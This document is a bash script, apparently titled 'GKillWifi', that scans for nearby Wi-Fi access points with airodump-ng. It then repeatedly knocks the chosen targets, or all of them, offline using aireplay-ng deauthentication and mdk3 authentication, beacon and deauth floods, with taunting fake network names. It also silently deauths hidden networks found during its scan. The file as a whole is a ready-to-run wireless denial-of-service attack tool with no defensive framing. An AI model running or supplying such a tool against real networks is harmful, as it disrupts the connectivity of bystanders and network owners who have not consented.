#!/bin/bash

# ══ Regular color ════════╗ START ╔═
    BK=$(tput setaf 232)  # Black
    GY=$(tput setaf 246)  # Gray
    RD=$(tput setaf 160)  # Red
    GR=$(tput setaf 46)   # Green
    YW=$(tput setaf 226)  # Yellow
    OR=$(tput setaf 208)  # Orange
    BL=$(tput setaf 80)   # Blue
    MG=$(tput setaf 129)  # Magenta
    PR=$(tput setaf 198)  # Purple
    CY=$(tput setaf 14)   # Cyan
    WH=$(tput setaf 15)   # White
    NM=$(tput sgr0)       # Norm
    BD=$(tput bold)       # Bold
    BG=$(tput setab 3)    # Background Color
# ══ Regular color ════════╝  END  ╚═

# ══ Move cursor ════════╗ START ╔═
    SVC=$(tput sc)      # save position
    RSC=$(tput rc)      # restore position
    NRC=$(tput cnorm)   # back position to norm
    UPC=$(tput cuu1)    # up position 1 line
    DWC=$(tput cud1)    # down position 1 line
    LFC=$(tput cub1)    # left position 1 line
    RGC=$(tput cuf1)    # right position 1 line
    CL1=$(tput el)      # clean line <==|
    CL2=$(tput el1)     # clean line |==>
# ══ Move cursor ════════╝  END  ╚═

# ══ Variables ════════╗ START ╔═
    VAR="1"
# ══ Variables ════════╝  END  ╚═

# ══ Verify the folder of Temporary files ════════╗ START ╔═
    GKillWifi_FOLDER="GKillWifi$(date "+%T" | tr -d ":")"
    Temp_GKillWifi="/tmp/${GKillWifi_FOLDER}"
    Dir=`ls /tmp | grep -E ^${GKillWifi_FOLDER}$`
    if [ "$Dir" != "" ];
        then
            rm -rf ${Temp_GKillWifi}
            mkdir ${Temp_GKillWifi}
        else
            mkdir ${Temp_GKillWifi}
    fi
# ══ Verify the folder of Temporary files ════════╝  END  ╚═

# ══ Create Fake ESSID list ════════╗ START ╔═
    echo -e "Bye WIFI" > ${Temp_GKillWifi}/fake_ssid.txt
    echo -e "Bye. WIFI" >> ${Temp_GKillWifi}/fake_ssid.txt
    echo -e "Bye.. WIFI" >> ${Temp_GKillWifi}/fake_ssid.txt
    echo -e "Bye... WIFI" >> ${Temp_GKillWifi}/fake_ssid.txt
    echo -e "Call me! " >> ${Temp_GKillWifi}/fake_ssid.txt
    echo -e "I do not know! " >> ${Temp_GKillWifi}/fake_ssid.txt
    echo -e "what is happening? " >> ${Temp_GKillWifi}/fake_ssid.txt
    echo -e "where is my wifi? " >> ${Temp_GKillWifi}/fake_ssid.txt
# ══ Create Fake ESSID list ════════╝  END  ╚═

# ══ Create table ════════╗ START ╔═
FUNC_create_tabl() {
    max_lf=""
    max_rh=""
    S=${#WORD}
    let IZ=${S}%2
    MIN=$((($MAX-$S)/2))
    for (( STIND=0;STIND<${MIN};STIND++))
        do
            max_lf=${max_lf}' '
        done
    if [ $IZ == 0 ]
        then
            for (( STIND=0;STIND<${MIN};STIND++))
                do
                    max_rh=${max_rh}' '
                done
        else
            for (( STIND=0;STIND<=${MIN};STIND++))
                do
                    max_rh=${max_rh}' '
                done
    fi
}
# ══ Create table ════════╝  END  ╚═

# ══ Exit and Clear temp files ════════╗ START ╔═
FUNC_exit_function() {
    VAR="0"
    killall -9 mdk3 2> /dev/null
    killall -9 aireplay-ng 2> /dev/null
    st_time_end=$(date +${BD}${GR}%H:%M:%S)
    echo -e "${CLC}"
    echo -e "${NRC}"
    echo -e ""
    echo -e "  $WH[${RD}!${WH}] ${NM}Wifi ${WH}killed ${BD}${YW}  STOPED  ${RD}${st_time_end}"
    echo -e ""
    echo -e "  $WH[${RD}!${WH}] Remove temporary file ."
    rm -rf ${Temp_GKillWifi}
    sleep 1
    echo ""
    exit
}
# ══ Exit and Clear temp files ════════╝  END  ╚═

# ══ Target search ════════╗ START ╔═
FUNC_dump() {
    timeout $tm airodump-ng --manufacturer -w ${Temp_GKillWifi}/dump --output-format csv $INFACE &> /dev/null &
    clear
    echo -e ""
    echo -en "${NRC}${DWC}${RGC}${RGC}${SVC} "
    while [[ "$tm" -ne 0 ]];
        do
            if [[ "$tm" -lt 10 ]];
            then
                echo -en "${RSC}${WH}[${RD}!$WH] ${BD}${GR}Search targets for attack ... ${BD}${RD} 0$tm ${NM}"
            else
                echo -en "${RSC}${WH}[${RD}!$WH] ${BD}${GR}Search targets for attack ... ${BD}${RD} $tm ${NM}"
            fi
            tm=$(($tm-1))
            sleep 1
    done
    cat ${Temp_GKillWifi}/dump-01.csv | sed -n '/^.\{130\}/p' | awk -F ',' '{print $1, $4, $9, $14}' | grep -E -a -o '^[0-9,aAbBcCdDeEfF]{1,2}(\:[0-9,aAbBcCdDeEfF]{1,2}){5}.*' | sort -u > ${Temp_GKillWifi}/list.txt
    rm ${Temp_GKillWifi}/dump-01.csv
}
# ══ Target search ════════╝  END  ╚═

# ══ Check dump ════════╗ START ╔═
FUNC_check_dump() {
    tm="30"
    FUNC_dump
    while read BSSID CH PW ESSID
        do
            if [[ -z "$ESSID" ]];
                then
                    iw dev ${INFACE} set channel ${CH} 2> /dev/null
                    aireplay-ng ${INFACE} -0 7 -a ${BSSID} &> /dev/null
            fi
    done < ${Temp_GKillWifi}/list.txt
}
# ══ Check dump ════════╝  END  ╚═

# ══ Target attack ════════╗ START ╔═
FUNC_killwifi() {
    iw dev ${INFACE} set channel ${CH} 2> /dev/null
    timeout 7 aireplay-ng ${INFACE} -0 7 -a ${BSSID} &> /dev/null &
    timeout 7 mdk3 ${INFACE} a -a ${BSSID} &> /dev/null &
    timeout 7 mdk3 ${INFACE} b -f ${Temp_GKillWifi}/fake_ssid.txt -t ${BSSID} -c ${CH} &> /dev/null &
    timeout 7 mdk3 ${INFACE} d -c ${CH} -w white_list.txt &> /dev/null &
    Mdk3_PID="$!"
}
# ══ Target attack ════════╝  END  ╚═

# ══ title for attack ════════╗ START ╔═
FUNC_title ()
    {
        MAX="20"
        echo -en " ${RSC}"
        echo -e ""
        echo -e "  ${NM}${YW} +-------------------------------------+"
        WORD="${BSSID}"
        FUNC_create_tabl
        echo -e "  ${NM}${YW} | ${BD}${BL}TARGET      ${NM}${CY}>>  ${BD}${WH}${max_lf}${WORD}${max_rh}${NM}${YW}|"
        WORD="${ESSID}"
        FUNC_create_tabl
        echo -e "  ${NM}${YW} | ${BD}${BL}ESSID       ${NM}${CY}>>  ${BD}${RD}${max_lf}${WORD}${max_rh}${NM}${YW}|"
        WORD="${CH}"
        FUNC_create_tabl
        echo -e "  ${NM}${YW} | ${BD}${BL}CHANNEL     ${NM}${CY}>>  ${BD}${WH}${max_lf}${WORD}${max_rh}${NM}${YW}|"
        echo -e "  ${NM}${YW} +-------------------------------------+"
    }
# ══ title for attack ════════╝  END  ╚═

# ══ Progress bar ════════╗ START ╔═
FUNC_progress_bar()
    {
        function ProgressBar {
        # Process data
            let _progress=(${1}*100/${2}*100)/100
            let _done=(${_progress}*2)/10
            let _left=20-$_done
        # Build progressbar string lengths
            _fill=$(printf "%${_done}s")
            _empty=$(printf "%${_left}s")
                printf "\r     ${BD}${RD}Attack:${WH}[${GR}${_fill// /#}${_empty// /-}${WH}] ${GR} ${_progress}%%"
        }
        # Variables
        # _start=1
        # _end=100
        for number in $(seq ${_start} ${_end})
            do
                sleep 1
                ProgressBar ${number} ${_end}
        done
        echo -e "${WH}"
    }
# ══ Progress bar ════════╝  END  ╚═

# ══ Select target ════════╗ START ╔═
FUNC_select_target() {
    clear
    echo -e "${BD}${CY}+-------------------------------------------+"
    echo -e "${BD}${CY}|       ${YW}SELECT TARGET EESID FOR ATTACK      ${CY}|"
    echo -e "${BD}${CY}+-------------------------------------------+"
    echo -e "${NM}${WH}"
    N=1
    while read BSSID CH PW ESSID
        do
            STARt="${N}${ESSID}"
            WORD=$STARt
            MAX="32"
            FUNC_create_tabl
            if [[ -z "$ESSID" ]];
                then
                    ESSID='NO NAME'
            fi
            echo -e "  ${WH}${N}${RD}) ${BD}${WH}${BSSID} ${NM}${GR} - ${BD}${YW}${ESSID}${NM}"
            N=$(($N+1))
    done < ${Temp_GKillWifi}/list.txt
    echo ""
    echo -e "${BD}${CY}|-------------------------------------------|"
    echo ""
    echo -en "${BD}${GR} ENTER Number target ${NM}${RD}[${WH}e.g.: ${CY}1,2,6 or ${BD}${RD}all${NM}${RD}]${CY}>> ${BD}${RD}${NM}"
    read NUM
    if [[ "$NUM" == "all" ]];
        then
            cat ${Temp_GKillWifi}/list.txt > ${Temp_GKillWifi}/file_target.txt
        else
            echo "${NUM}" | tr "," "\n" | sed 's/[^0-9]//g' > ${Temp_GKillWifi}/select_num_target.txt
            echo -en "" > ${Temp_GKillWifi}/file_target.txt
            while read NUMTARGET
                do
                    TARGETTMP=$(sed -n "${NUMTARGET}{p;q;}" ${Temp_GKillWifi}/list.txt)
                    echo -e "$TARGETTMP" >> ${Temp_GKillWifi}/file_target.txt
            done < ${Temp_GKillWifi}/select_num_target.txt
    fi
    while read ignore_target
        do
            sed -i "/${ignore_target}/d" ${Temp_GKillWifi}/file_target.txt
    done < white_list.txt
    clear
}
# ══ Select target ════════╝  END  ╚═

# ══ Cycle ════════╗ START ╔═
FUNC_cycle() {
    tm="15"
    FUNC_dump
    clear
    if [[ "$tm" -eq "0" ]];
        then
            FUNC_select_target
            Num_targets=`cat ${Temp_GKillWifi}/file_target.txt 2> /dev/null | wc -l`
            Num_white=`cat white_list.txt 2> /dev/null | wc -l`
            echo ""
            echo -e "${NM}${WH}  +${CY}-------------------------${WH}+"
            echo -e "${NM}${CY}  |${WH} [${RD}+${WH}]${YW}   Information   ${CY}    |"
            echo -e "${NM}${WH}  +${CY}-------------------------${WH}+${CY}-------------${WH}>"
            echo -e "${NM}${CY}  |    ${GR}>>${RD} Found Target${WH}  : ${BD}${RD}${Num_targets}"
            echo -e "${NM}${CY}  |    ${GR}>>${GR} White point  ${WH} : ${BD}${GR}${Num_white}"
            echo -e "${NM}${CY}  |    ${GR}>>${BL} Interface    ${WH} : ${BD}${BL}${INFACE}"
            echo -e "${NM}${CY}  |    ${GR}>>${WH} White list   ${WH} : ${BD}${WH}white_list.txt"
            echo -e "${NM}${WH}  +${CY}---------------------------------------${WH}>"
            echo -en "${NRC}${DWC}${RGC}${RGC}${SVC} "
            if [[ "$Num_targets" -gt "0" ]]
                then
                    st_time=$(date +${BD}${GR}%H:%M:%S)
                    echo -e "${RSC}${WH}[${RD}!${WH}] ${NM}Wifi ${WH}killed ${BD}${RD} STARTING ${NM}${RD}${st_time}    "
                    echo -en " ${SVC}"
                    TMP_ATTEMPT=0
                    while [[ "$TMP_ATTEMPT" -le "7" ]];
                        do
                            while read BSSID CH PW ESSID
                                do
                                    _start=1
                                    let _end=6
                                    FUNC_title
                                    FUNC_killwifi
                                    FUNC_progress_bar
                            done < ${Temp_GKillWifi}/file_target.txt
                            TMP_ATTEMPT=$(($TMP_ATTEMPT+1))
                    done
                    FUNC_Cycle
                else
                    clear
                    echo -e ""
                    echo -e "${RSC}${WH}[${RD}!${WH}] ${NM}Clients${RD} Not Found${WH} ."
            fi
    fi
}
# ══ Cycle ════════╝  END  ╚═

# ══ Base func ════════╗ START ╔═
trap FUNC_exit_function SIGINT
INFACENUM=`iwconfig 2>&1 | grep 'Mode:Monitor' | awk '{print $1}' | wc -l`
if [[ "$INFACENUM" -gt 1 ]];
    then
        echo -e " ${NM}${CY}╔════════════════════════╗"
        echo -e " ${NM}${CY}║    ${BD}${YW}SELECT INTERFACE    ${NM}${CY}║"
        echo -e " ${NM}${CY}╚════════════════════════╝"
        echo -en "${BD}${WH}"
        iwconfig 2>&1 | grep 'Mode:Monitor' | awk '{print $1}'| nl -s ') ' 2>/dev/null
        echo -e " ${NM}${CY}╚════════════════════════╝"
        echo -en " ${SVC}${NM}Enter NUM ${NM}${BD}${CY}> ${BD}${RD}"
        read NUM
        INFACE=`iwconfig 2>&1 | grep 'Mode:Monitor' | awk '{print $1}'| nl -s ') ' | grep $NUM | awk '{print $2}'`
        clear
    else
        INFACE=`iwconfig 2>&1 | grep 'Mode:Monitor' | awk '{print $1}'`
fi
if [[ -n "$INFACE" ]];
    then
        if [[ "$VAR" -eq "1" ]]
            then
                FUNC_cycle
            else
                FUNC_exit_function
        fi
    else
        clear
        echo -e ""
        echo -e "${WH}  [${RD}!$WH] ${NM}Wireless Card${RD} Not Found${WH} ."
        FUNC_exit_function
fi

# ══ Base func ════════╝  END  ╚═